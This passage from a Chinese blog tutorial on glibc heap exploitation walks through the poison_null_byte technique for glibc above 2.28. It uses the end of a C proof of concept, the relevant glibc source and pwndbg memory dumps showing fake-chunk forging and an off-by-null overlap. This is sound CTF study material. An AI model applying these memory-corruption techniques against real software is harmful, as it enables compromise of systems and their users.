class="built_in">puts</span>(<span class="string">&quot;Overwrite prev&#x27;s content&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prev2, <span class="string">&#x27;C&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;merged&#x27;s content has changed to: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(merged, <span class="string">&quot;CCCCCCCCC&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-4"><a href="#基础知识-4" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>2.29</code>后的<code>libc</code>在两个<code>free chunk</code> 进行合并前多一次对<code>prevsize</code>的值检查对应的源代码如下:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-26"><a href="#调试-26" class="headerlink" title="调试"></a>调试</h3><ol>
<li>第一步重要的是让新申请的chunk末两字节的位置为 <code>\x00\x00</code>，方便以后的利用。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d2b0</span><br><span class="line">Size: 0x2d50 (with flag bits: 0x2d51)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555560000</span><br><span class="line">Size: 0x1e000 (with flag bits: 0x1e001)</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>接下来申请两个chunk，prev_0x510和victim_0x500，以及一个barrier_0x20。这两个chunk是为了后续合并利用。然后继续申请a_0x500，barrier_0x20，b_0x520，barrier_0x20。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d2b0</span><br><span class="line">Size: 0x2d50 (with flag bits: 0x2d51)</span><br><span class="line">// prev</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555560000</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line">// victim</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555560510</span><br><span class="line">Size: 0x500 (with flag bits: 0x501)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555560a10</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">// a</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555560a30</span><br><span class="line">Size: 0x500 (with flag bits: 0x501)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555560f30</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">// b</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555560f50</span><br><span class="line">Size: 0x520 (with flag bits: 0x521)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555561470</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555561490</span><br><span class="line">Size: 0x1cb70 (with flag bits: 0x1cb71)</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li>依次释放 a，b，prev，然后申请一个 0x1010大小的 chunk，出发整理机制，将其放入 largebin 中。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">largebins	//b prev a</span><br><span class="line">0x500-0x530: 0x555555560f50 —▸ 0x555555560000 —▸ 0x555555560a30 —▸ 0x7ffff7bb7010 (main_arena+1168) ◂— 0x555555560f50</span><br><span class="line">// b</span><br><span class="line">pwndbg&gt; x/8gx 0x555555560f50</span><br><span class="line">0x555555560f50:	0x0000000000000000	0x0000000000000521</span><br><span class="line">0x555555560f60:	0x0000555555560000	0x00007ffff7bb7010</span><br><span class="line">0x555555560f70:	0x0000555555560000	0x0000555555560a30</span><br><span class="line">0x555555560f80:	0x0000000000000000	0x0000000000000000</span><br><span class="line">// prev</span><br><span class="line">pwndbg&gt; x/8gx 0x555555560000</span><br><span class="line">0x555555560000:	0x0000000000000000	0x0000000000000511</span><br><span class="line">0x555555560010:	0x0000555555560a30	0x0000555555560f50</span><br><span class="line">0x555555560020:	0x0000555555560a30	0x0000555555560f50</span><br><span class="line">0x555555560030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">// a</span><br><span class="line">pwndbg&gt; x/8gx 0x555555560a30</span><br><span class="line">0x555555560a30:	0x0000000000000000	0x0000000000000501</span><br><span class="line">0x555555560a40:	0x00007ffff7bb7010	0x0000555555560000</span><br><span class="line">0x555555560a50:	0x0000555555560f50	0x0000555555560000</span><br><span class="line">0x555555560a60:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li>接下来将 prev 申请回来，将其 bk 位置写为 0x501，将victim_prev_size写为0x500，充当fake_chunk的size，其fd_next和bk_next分别指向a和b。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// prev&amp;fake_chunk</span><br><span class="line">pwndbg&gt; x/8gx 0x555555560000</span><br><span class="line">0x555555560000:	0x0000000000000000	0x0000000000000511</span><br><span class="line">0x555555560010:	0x0000555555560a30	0x0000000000000501</span><br><span class="line">0x555555560020:	0x0000555555560a30	0x0000555555560f50</span><br><span class="line">0x555555560030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">// victim</span><br><span class="line">pwndbg&gt; x/8gx 0x555555560510</span><br><span class="line">0x555555560510:	0x0000000000000500	0x0000000000000501</span><br><span class="line">0x555555560520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555560530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555560540:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></div>

<ol start="5">
<li>接下来将b申请回来，修改其fd位置后两位为<code>\x00\x10</code>，让b的fd指向 <code>fake_chunk</code>。再将a申请出来，然后依次释放a和victim，让a的bk指向victim。然后在修改其后两位为<code>\x00\x10</code>，让a的bk指向<code>fake_chunk</code>。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// b</span><br><span class="line">pwndbg&gt; x/8gx 0x555555560f50</span><br><span class="line">0x555555560f50:	0x0000000000000000	0x0000000000000521</span><br><span class="line">0x555555560f60:	0x0000555555560010	0x00007ffff7bb7010</span><br><span class="line">0x555555560f70:	0x0000555555560a30	0x0000555555560a30</span><br><span class="line">0x555555560f80:	0x0000000000000000	0x0000000000000000</span><br><span class="line">// a</span><br><span class="line">pwndbg&gt; x/8gx 0x555555560a30</span><br><span class="line">0x555555560a30:	0x0000000000000000	0x0000000000000501</span><br><span class="line">0x555555560a40:	0x00007ffff7bb6be0	0x0000555555560010</span><br><span class="line">0x555555560a50:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555560a60:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></div>

<ol start="6">
<li>接下来要做的就简单了，将victim申请回来，然后利用off-by-null将其size的prev_inuse位清零，然后free掉victim。就完成了依次overlap。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x555555560000</span><br><span class="line">0x555555560000:	0x0000000000000000	0x0000000000000511</span><br><span class="line">0x555555560010:	0x0000555555560a30	0x0000000000000a01</span><br><span class="line">0x555555560020:	0x00007ffff7bb6be0	0x00007ffff7bb6be0</span><br><span class="line">0x555555560030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555560010 —▸ 0x7ffff7bb6be0 (main_arena+96) ◂— 0x555555560010</span><br></pre></td></tr></table></figure></div>


		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> 深入理解Pwn_heap及赛题详细解析</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2023-09-22 08:53:34</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-11-07 11:35:11
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2023/09/22/深入理解Pwn_heap及赛题详细解析/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Pwn-Heap/">#Pwn_Heap</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Tcache安全机制及赛题详细解析</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2023/09/20/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">关于博客</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">深入理解Pwn_heap及赛题详细解析</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="nav-text">第一部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-into-stack"><span class="nav-text">fastbin_dup_into_stack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsorted-bin-attack"><span class="nav-text">unsorted_bin_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-1"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-1"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsorted-bin-into-stack"><span class="nav-text">unsorted_bin_into_stack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-2"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-2"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-spirit"><span class="nav-text">house_of_spirit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-3"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-3"><span class="nav-text">调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="nav-text">第二部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="nav-text">例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup"><span class="nav-text">fastbin_dup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-4"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-4"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-text">fastbin_dup_consolidate</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-5"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-5"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsafe-unlink"><span class="nav-text">unsafe_unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-6"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-6"><span class="nav-text">调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86"><span class="nav-text">第三部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="nav-text">例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poison-null-byte"><span class="nav-text">poison_null_byte</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-7"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-7"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#overlapping-chunks-1"><span class="nav-text">overlapping_chunks_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-8"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-8"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#overlapping-chunks-2"><span class="nav-text">overlapping_chunks_2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-9"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-9"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-einherjar"><span class="nav-text">house_of_einherjar</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-10"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-10"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-force"><span class="nav-text">house_of_force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-11"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-11"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#large-bin-attack"><span class="nav-text">large_bin_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-12"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-12"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-storm"><span class="nav-text">house of storm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-13"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-13"><span class="nav-text">调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86"><span class="nav-text">第四部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-3"><span class="nav-text">例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-lore"><span class="nav-text">house of lore</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-14"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-14"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-mind-fastbin"><span class="nav-text">house_of_mind_fastbin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-15"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-15"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-roman"><span class="nav-text">house_of_roman</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-16"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-16"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mmap-overlapping-chunks"><span class="nav-text">mmap_overlapping_chunks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-17"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-17"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-gods"><span class="nav-text">house_of_gods</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-18"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-18"><span class="nav-text">调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86"><span class="nav-text">第五部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-reverse-into-tcache"><span class="nav-text">fastbin_reverse_into_tcache</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-19"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-19"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-botcake"><span class="nav-text">house_of_botcake</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-20"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-20"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-house-of-spirit"><span class="nav-text">tcache_house_of_spirit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-21"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-21"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-poisoning"><span class="nav-text">tcache_poisoning</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-22"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-22"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-stashing-unlink-attack"><span class="nav-text">tcache_stashing_unlink_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-23"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-23"><span class="nav-text">调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E9%83%A8%E5%88%86"><span class="nav-text">第六部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#large-bin-attack-glibc-2-29"><span class="nav-text">large_bin_attack (glibc &gt; 2.29)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-24"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-2"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-24"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#decrypt-safe-linking-glibc-2-31"><span class="nav-text">decrypt_safe_linking(glibc &gt; 2.31)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-25"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-3"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-25"><span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poison-null-byte%EF%BC%88glibc-2-28%EF%BC%89"><span class="nav-text">poison_null_byte（glibc &gt; 2.28）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81-26"><span 